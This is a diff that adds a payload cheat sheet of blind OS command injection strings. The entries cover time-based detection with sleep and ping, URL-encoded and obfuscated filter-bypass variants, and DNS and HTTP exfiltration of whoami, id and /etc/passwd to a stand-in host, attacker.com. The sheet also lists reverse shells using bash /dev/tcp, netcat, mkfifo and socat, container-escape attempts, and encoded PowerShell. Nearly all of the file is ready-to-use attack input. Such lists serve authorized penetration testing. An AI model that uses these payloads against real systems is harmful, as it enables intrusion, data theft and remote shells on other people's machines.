@@ -1,0 +1,281 @@
+```bash
+# COMPREHENSIVE BLIND COMMAND INJECTION PAYLOADS
+
+# Basic Time-Based Delays (Unix/Linux)
+; sleep 10
+& sleep 10
+| sleep 10
+&& sleep 10
+|| sleep 10
+`sleep 10`
+$(sleep 10)
+; ping -c 10 127.0.0.1
+& ping -c 10 127.0.0.1
+| ping -c 10 127.0.0.1
+; ping -c 10 localhost
+& ping -c 10 localhost
+
+# Basic Time-Based Delays (Windows)
+; timeout 10
+& timeout 10
+| timeout 10
+&& timeout 10
+|| timeout 10
+; ping -n 10 127.0.0.1
+& ping -n 10 127.0.0.1
+| ping -n 10 127.0.0.1
+; ping -n 10 localhost
+& ping -n 10 localhost
+
+# URL Encoded Time Delays
+%3B%20sleep%2010
+%26%20sleep%2010
+%7C%20sleep%2010
+%26%26%20sleep%2010
+%7C%7C%20sleep%2010
+%60sleep%2010%60
+%24%28sleep%2010%29
+%3B%20ping%20-c%2010%20127.0.0.1
+%26%20ping%20-c%2010%20127.0.0.1
+
+# Double URL Encoded
+%253B%2520sleep%252010
+%2526%2520sleep%252010
+%257C%2520sleep%252010
+%2526%2526%2520sleep%252010
+%257C%257C%2520sleep%252010
+
+# DNS-Based Exfiltration
+; nslookup $(whoami).attacker.com
+& nslookup `whoami`.attacker.com
+| nslookup $(id).attacker.com
+; dig $(whoami).attacker.com
+& dig `hostname`.attacker.com
+| dig $(pwd|base64).attacker.com
+; ping $(whoami).attacker.com
+& ping `id`.attacker.com
+; nslookup $(cat /etc/passwd | base64 | tr -d '\n').attacker.com
+& dig $(ls -la | base64 | cut -c1-50).attacker.com
+; nslookup $(whoami | xxd -p).attacker.com
+& ping $(hostname | od -tx1 | tr -d ' \n').attacker.com
+
+# HTTP-Based Exfiltration
+; wget http://attacker.com/$(whoami)
+& wget http://attacker.com/`id`
+| wget --post-data="$(cat /etc/passwd)" http://attacker.com
+; curl http://attacker.com/$(whoami)
+& curl -d "$(id)" http://attacker.com/data
+| curl -X POST -d "data=$(ls -la)" http://attacker.com
+; curl -d "$(cat /etc/passwd | base64)" http://attacker.com/exfil
+& wget -O- --post-data="$(whoami)" http://attacker.com/collect
+
+# Advanced Payload Variations
+${IFS}sleep${IFS}10
+$IFS$()sleep$IFS$()10
+{sleep,10}
+S\leep 10
+sl\eep 10
+SLEEP 10
+Sleep 10
+s'leep' 10
+s"leep" 10
+s\l\e\e\p 10
+$(echo c2xlZXAgMTA= | base64 -d)
+`echo c2xlZXAgMTA= | base64 -d`
+; echo $(whoami) > /dev/tcp/attacker.com/80
+& echo `id` > /dev/tcp/attacker.com/80
+
+# OS Command Separators with Different Commands
+; id
+& id
+| id
+&& id
+|| id
+; whoami
+& whoami
+| whoami
+; pwd
+& pwd
+| pwd
+; ls
+& ls
+| ls
+; uname -a
+& uname -a
+| uname -a
+
+# Newline Injections
+%0a sleep 10
+%0d sleep 10
+%0a%0d sleep 10
+\n sleep 10
+\r sleep 10
+\r\n sleep 10
+
+# Space Bypass Techniques
+;sleep${IFS}10
+&sleep$IFS$()10
+|sleep<10
+;sleep\t10
+&sleep%0910
+{sleep,10}
+$'sleep\x2010'
+
+# Conditional Delays
+; [ $(id|wc -c) -gt 10 ] && sleep 10
+& [ `whoami|wc -c` -gt 0 ] && sleep 5
+| test $(id) && sleep 10
+; $(id) && sleep 10 || sleep 5
+& `whoami` && sleep 10
+
+# File-Based Blind Injection
+; touch /tmp/injected
+& echo $(whoami) > /tmp/test
+| ls > /tmp/listing
+; cp /etc/passwd /tmp/pwned
+& cat /etc/hosts > /tmp/hosts_copy
+
+# Math-Based Delays
+; python -c "import time; time.sleep(10)"
+& perl -e "sleep 10"
+| ruby -e "sleep 10"
+; php -r "sleep(10);"
+& node -e "setTimeout(function(){}, 10000)"
+
+# Reverse Shell Attempts (Blind)
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+& nc -e /bin/bash attacker.com 4444
+| telnet attacker.com 4444 | /bin/bash | telnet attacker.com 4445
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+
+# PowerShell (Windows)
+; powershell -c "Start-Sleep -s 10"
+& powershell.exe -c "ping -n 10 127.0.0.1"
+| powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==
+
+# Alternative Encoding Methods
+; $(printf "\x73\x6c\x65\x65\x70\x20\x31\x30")
+& `printf "\163\154\145\145\160\040\061\060"`
+| $(echo -e "\x73\x6c\x65\x65\x70\x20\x31\x30")
+
+# Time-based with Error Conditions
+; sleep 10 2>/dev/null
+& sleep 10 1>/dev/null
+| sleep 10 &>/dev/null
+; (sleep 10)
+& {sleep 10;}
+
+# Pipe Chain Injections
+| tee /dev/null && sleep 10
+| cat && sleep 10
+| grep . && sleep 10
+| head -1 && sleep 10
+| tail -1 && sleep 10
+
+# HTB/HackerOne Inspired Payloads
+%0a/bin/sleep%2010
+%0d%0a/usr/bin/sleep%2010
+; /bin/bash -c 'sleep 10'
+& /bin/sh -c 'sleep 10'
+| /usr/bin/timeout 10s sleep 10
+; exec sleep 10
+& eval sleep\ 10
+$(busybox sleep 10)
+`/system/bin/sleep 10`
+
+# Obfuscated Commands
+; sl${u}eep 1${u}0
+& s\le\ep 1\0
+| $(tr 'a-z' 'n-za-m' <<< 'fwrrc 10')
+; $(echo 'c2xlZXAgMTA='|base64 -d|sh)
+
+# Multi-Protocol Exfiltration
+; nc -u attacker.com 53 <<< $(whoami)
+& socat TCP:attacker.com:80 EXEC:'/bin/bash'
+| /dev/tcp/attacker.com/80 <<< $(id)
+; exec 5<>/dev/tcp/attacker.com/80 && echo $(whoami) >&5
+
+# Advanced Time-based with Loops
+; for i in {1..10}; do sleep 1; done
+& while [ $((i++)) -lt 10 ]; do sleep 1; done
+| seq 10 | xargs -I {} sleep 1
+
+# System Information Gathering
+; uname -a > /dev/tcp/attacker.com/80
+& cat /proc/version | base64 | nc attacker.com 80
+| id | curl -d @- attacker.com/data
+; whoami | wget --post-data=@- attacker.com/collect
+
+# Environment Variable Manipulation
+; HOME=/tmp sleep 10
+& PATH=/bin:/usr/bin sleep 10
+| USER=attacker sleep 10
+
+# Process-based Detection
+; (sleep 10 &)
+& nohup sleep 10 &
+| sleep 10 & disown
+
+# Error-based Blind Injection
+; sleep 10 || false
+& sleep 10 && true
+| false || sleep 10
+; true && sleep 10
+
+# Container/Docker Escape Attempts
+; docker exec -it $(docker ps -q) sleep 10
+& nsenter -t 1 -m -u -i -n -p sleep 10
+| chroot /host sleep 10
+
+# Web-specific Injections
+Content-Type: application/x-www-form-urlencoded; sleep 10
+X-Forwarded-For: 127.0.0.1; sleep 10
+User-Agent: Mozilla/5.0; sleep 10
+Referer: http://evil.com/$(sleep 10)
+
+# Template Injection Style
+{{7*7}} && sleep 10
+${7*7} && sleep 10
+#{7*7} && sleep 10
+<%= 7*7 %> && sleep 10
+
+# SQL-style Injections in Commands
+'; sleep 10; --
+'; sleep 10; #
+' AND sleep(10); --
+' OR sleep(10); #
+
+# NoSQL-style Injections
+'; sleep(10); //
+'; this.sleep(10000); return true; //
+{"$where": "sleep(10000); return true;"}
+
+# LDAP-style Injections
+*)(&(sleep=10
+*)(|(sleep=10
+*))%00(sleep=10
+
+# XML/XXE Style
+<!ENTITY xxe SYSTEM "file:///dev/zero"> && sleep 10
+<!--#exec cmd="sleep 10" -->
+
+# Serialization Payloads
+O:8:"stdClass":1:{s:4:"exec";s:8:"sleep 10";}
+a:1:{i:0;s:8:"sleep 10";}
+
+# Alternative Sleep Commands
+; usleep 10000000
+& nanosleep 10
+| timeout 10s cat
+; yes > /dev/null & sleep 10; kill %1
+
+# Memory/CPU Based Delays
+; dd if=/dev/zero of=/dev/null bs=1M count=1000
+& openssl speed -seconds 10
+| find / -name "*" 2>/dev/null | head -1000000
+
+# Network-based Delays
+; nc -z -w10 google.com 80
+& telnet google.com 80 < /dev/null
+| wget -T 10 -t 1 http://httpbin.org/delay/10
+```
